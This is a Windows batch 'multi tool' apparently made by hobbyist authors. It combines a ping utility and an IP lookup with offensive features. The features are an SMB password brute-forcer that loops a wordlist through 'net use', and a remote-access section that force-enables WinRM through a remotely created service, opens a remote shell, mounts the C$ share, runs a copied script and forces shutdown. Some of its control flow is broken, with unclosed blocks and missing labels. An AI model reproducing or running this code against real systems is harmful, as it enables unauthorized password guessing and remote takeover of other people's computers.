@echo off 
title Frozen Multi Tool 
color 0c

goto main
:main 
echo.

color 0c
echo      __  ___      ____  _    ______            __       __                 __________  ____  _____   _______   __
echo     /  //  /_  __/ / /_(_)  /_  __/___  ____  / /      / /_  __  __       / ____/ __ \/ __ \/__  /  / ____/ / / /
echo    / //_/ / / / / / __/ /    / / / __ \/ __ \/ /      / __ \/ / / /      / /_  / /_/ / / / /  / /  / __/ /  \/ / 
echo   / /  / / /_/ / / /_/ /    / / / /_/ / /_/ / /      / /_/ / /_/ /      / __/ / _, _/ /_/ /  / /__/ /___/ /\  /  
echo  /_/  /_/\__,_/_/\__/_/    /_/  \____/\____/_/      /_.___/\__, /      /_/   /_/ /_/\____/  /____/_____/_/ /_/   
echo                                                           /____/                                                 

echo and some paste of Ebola man 
echo .
echo .
echo [1] = Ip / Website Pinger 
echo [2] = Remote Desktop Connection ( dont work for the moment, so connect yourself =
echo [3] = IP Lookup 
echo [4] = Session Password Bruteforce 


set choiceinput=
set /p choiceinput= Choose : 

if %choiceinput%==1 goto pinger 
if %choiceinput%==2 goto RDC
if %choiceinput%==3 goto iplook
if %choiceinput%==4 goto bruteforce

:pinger
cls
Color 0c
set adress=
set /p adress= Paste the ip or website link :

set numberping=
set /p numberping= number of ping do you want : 

ping  -4  -n %numberping% %adress%
pause
cls 

goto main

:RDC

cd files >nul
mode 100, 30
color 0B
title PsExec
set success=[92m[+][0m
set warning=[91m[!][0m
set info=[94m[*][0m
set servicename=winrm%random%
cls
chcp 65001 >nul
echo    Computer  
set /p domain=">> "
cls
echo     Username
set /p user=">> "
cls
echo    Password  
set /p pass=">> "
cls
echo %info% Connecting to %domain%...
rem Disconnects any running connections
net use \\%domain% /user:%user% %pass% >nul 2>&1
rem Connects to the PC with SMB
net use \\%domain% /user:%user% %pass% >nul 2>&1

if /I "%errorlevel%" NEQ "0" (
  echo %warning% Invalid Credentials or Network Issue
pause 
goto main 
)

echo %success% Connected!
timeout 8
goto main 

:winrm
echo %info% Checking for WinRM...
chcp 437 >nul
powershell -Command "Test-WSMan -ComputerName %domain%" >nul 2>&1
set errorcode=%errorlevel%
chcp 65001 >nul

if /I "%errorcode%" NEQ "0" (
  echo %info% Creating Remote Service...
  rem Creates a service on the remote PC that enables WinRM
  sc \\%domain% create %servicename% binPath= "cmd.exe /c winrm quickconfig -force"
  echo %success% Configuring WinRM...
  sc \\%domain% start %servicename%
  echo %info% Deleting Service...
  sc \\%domain% delete %servicename%
  goto menu
)

if /I "%errorcode%" EQU "0" (
  chcp 65001 >nul
  echo %success% %domain% has WinRM Enabled!
  timeout /t 3 >nul
  goto menu
)

:menu
cls
call :banner
echo.
echo %info% Connected to %domain%
echo.
echo [95m[1][0m » Shell
echo [95m[2][0m » Files ( Require admin acces )
echo [95m[4][0m » Shutdown
echo [95m[5][0m » Disconnect
echo.
set /p " =>> " <nul
choice /c 12345 >nul

if /I "%errorlevel%" EQU "1" (
  cls
  echo.
  echo %success% Opening Remote Shell...
  echo.
  rem Opens remote cmd with WinRS
  winrs -r:%domain% -u:%user% -p:%pass% cmd
  goto menu
)

if /I "%errorlevel%" EQU "2" (
  start "" "\\%domain%\C$"
  cls
  goto menu
)

if /I "%errorlevel%" EQU "3" (
  cls
  echo.
  echo %info% Gathering Info..
  copy "info.bat" "\\%domain%\C$\ProgramData\info.bat" >nul
  winrs -r:%domain% -u:%user% -p:%pass% C:\ProgramData\info.bat
  pause
  del "\\%domain%\C$\ProgramData\info.bat"
  goto menu
)

if /I "%errorlevel%" EQU "4" (
  winrs -r:%domain% -u:%user% -p:%pass% "shutdown /s /f /t 0"
  cls
  goto menu
)

if /I "%errorlevel%" EQU "5" (
  net use \\%domain% /d /y >nul 2>&1
  goto start
  
  :iplook
  
  title IP Lookup by FROZEN

color 0d

:ip
cls
echo.
set/p IP="Enter IP Adress >: "
curl -s http://ip-api.com/line/%IP%?fields=message,country,regionName,zip,isp
pause
goto start

:bruteforce 

title Session Bruteforce - Made by Ebola man / Improve by FROZEN
cls
echo ATTENTION ! IF U USE THIS PROGRAM ON YOUR OWN COMPUTER, IT MAY BLOCK IT AND DONT WORK SOME MINUTES, BE CAREFUL

set /p ip="Desktop Name: "
set /p user="Username: "
set /p wordlist="Password List ( need to be in the same folder ) : "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto main

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
